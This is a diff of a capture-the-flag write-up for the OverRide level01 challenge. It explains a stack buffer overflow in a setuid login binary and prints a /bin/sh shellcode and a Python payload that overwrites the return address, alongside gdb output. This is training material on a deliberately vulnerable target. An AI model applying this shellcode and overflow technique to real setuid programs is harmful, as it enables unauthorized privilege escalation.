@@ -3,27 +3,72 @@
 ## 1. Inspect The Executable
 
 ```bash
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level01/level01
 level01@OverRide:~$ ls -l
 total 8
 -rwsr-s---+ 1 level02 users 7360 Sep 10  2016 level01
 ```
 
+We can see that the binary has the `s` bit set on the **execution permission**, which means the program will run with **`level02` privileges**.
+
+```bash
+level01@OverRide:~$ ./level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: username
+verifying username....
+
+nope, incorrect username...
+
+level01@OverRide:~$ ./level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+verifying username....
+
+nope, incorrect username...
+
+level01@OverRide:~$ ./level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+verifying username....
+
+nope, incorrect username...
+
+```
+
+The program asks for a username and there is no sign of overflow possible at first sight.
+
 ## 2. Analyze The Executable
+
+```bash
+(gdb) info functions 
+All defined functions:
+
+Non-debugging symbols:
+[...]
+0x08048464  verify_user_name
+0x080484a3  verify_user_pass
+0x080484d0  main
+[...]
+```
+
+Using the gdb command `info functions`, we can list all functions present in the binary.
+Here, we find 3 functions : `main`, `verify_user_name`, `verify_user_pass`.
 
 ### Program Behavior
 
 #### main function
 
-The main function ask for a username and verify it with `verify_user_name()`. Ff the username is valid, it ask a password and verify it with `verify_user_pass()`. But in anyway the program will print `"nope, incorrect password..."` and return `1`;
+The `main` function ask for a username and verify it with `verify_user_name()`. Ff the username is valid, it ask a password and verify it with `verify_user_pass()`. But in anyway the program will print `"nope, incorrect password..."` and return `1`;
 Each time, the `fgets` made to get the user input are with a limited size of `0x100` (256 bytes in decimal). 
 
 #### verify_user_name function
 
-The verify_user_name function compare the username given by the user to `"dat_wil"`. But its only check if the 7 first bytes is equal to this string. The following character of the username are not check.
+The `verify_user_name` function compare the username given by the user to `"dat_wil"`. But its only check if the `7` first bytes is equal to this string. The following character of the username are not check.
 
 #### verify_user_pass function
 
-The verify_user_name function compare the username given by the user to `"dat_wil"`. But its only check if the 7 first bytes is equal to this string. The following character of the username are not check.
+The `verify_user_pass` function compare the pass given by the user to `"admin"`. But its only check if the `5` first bytes is equal to this string. The following character of the pass are not check.
 
 ## 3. Identify The Vulnerability
 
@@ -33,17 +78,46 @@ First we can see that this `fgets(local_54,100,stdin)` call for the password is 
 
 ### Stack Overflow Explaination
 
-[stack overflow explanation]
+A **Stack Overflow Attack** consists of **writing more data** than the allocated space of a **local variable on the stack**, allowing us to overwrite critical values such as saved registers.
+
+### Stack Understanding
+
+To understand the buffer overflow, we need to **understand how the stack works**.
+
+The **stack** is a memory area organized as **FILO** (First In, Last Out).
+On x86 architectures, the stack grows from high addresses to low addresses.
+
+At each function call, the stack frame contains:
+
+- The **saved EIP** (Instruction Pointer), which points to the **next instruction** of the caller (4 bytes, located at EBP+4).
+- The **saved EBP** (Base Pointer) of the **caller** (4 bytes, located at EBP).
+- The current function **sets EBP** to point to the **new stack frame**.
+- **Space** allocated for **local variables** by adjusting **ESP**.
+
+This means that **local variables** are located **below the saved EBP**, and **overflowing** them allows us to **overwrite** the **saved EBP** and then the **saved EIP**.
+
+![img](Ressources/stack-frame.png)
 
 ---
 
-But here, there is no `system()` call so we are gonna use a shellcode.
+Terminology:
+- **Caller**: The function that calls another function.
+- **Callee**: The function that is being called.
 
 ---
+
+The main difficulty here is deciding **where to redirect execution**. There is **no internal function** that directly **spawns a shell**.
+To solve this, we use an **external payload** called `shellcode`.
 
 ### Shellcode Explaination
 
-[shellcode explaination]
+A **shellcode** is a **sequence of machine instructions** encoded in hexadecimal. It is not human-readable, and it is **executable by the CPU**. Like this following example :
+
+```
+\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
+```
+
+(This one was taken form [shell-storm](https://shell-storm.org/shellcode/files/shellcode-841.html).)
 
 ---
 
@@ -136,6 +210,11 @@ And we need to put the username to:
 python -c 'print "dat_wil"'; sleep 1; python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'a' * 59 + '\xec\xd6\xff\xff"'
 ```
 
+### Overflow Visualization
+
+![img](Ressources/level01-overflow.png)
+
+
 ## 4. Capture The Flag
 
 ```bash
@@ -153,31 +232,4 @@ XXX
 exit
 ```
 
-`cat` here allow to keep stdin open after the payload injection, to use the shellcode.
-
----
-
-## 5. Another Way
-
-We can also put the shellcode in the username variable.
-The offset change:
-```bash
-(gdb) r
-Starting program: /home/users/level01/level01 
-********* ADMIN LOGIN PROMPT *********
-Enter Username: dat_wilaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
-verifying username....
-
-Enter Password: 
-nope, incorrect password...
-
-
-Program received signal SIGSEGV, Segmentation fault.
-0x45454545 in ?? ()
-```
-
-`0x45` is 69 in decimal and `E` in ASCII. So we got a offset of `335 bytes`.
-
-Note that the pattern injected include the username `dat_wil`.
-
-EUHHHH ----- Vraiment necessaire ? Peut faire sans `dat_wil`, non ?
+`cat` here allow to keep `stdin` open after the payload injection, to use the shellcode.
